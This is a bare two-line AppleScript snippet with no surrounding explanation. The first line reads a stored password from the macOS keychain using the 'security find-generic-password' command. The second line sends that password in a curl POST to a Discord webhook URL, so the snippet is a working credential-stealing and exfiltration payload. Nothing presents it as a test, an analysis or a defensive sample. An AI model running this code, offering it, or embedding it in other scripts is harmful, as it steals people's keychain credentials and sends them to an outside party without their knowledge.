set pw to do shell script "security find-generic-password -ga user 2>&1 | grep password"
do shell script "curl -X POST -H 'Content-Type: application/json' -d '{\"content\": \"Got password: " & pw & "\"}' https://discord.com/api/webhooks/...."
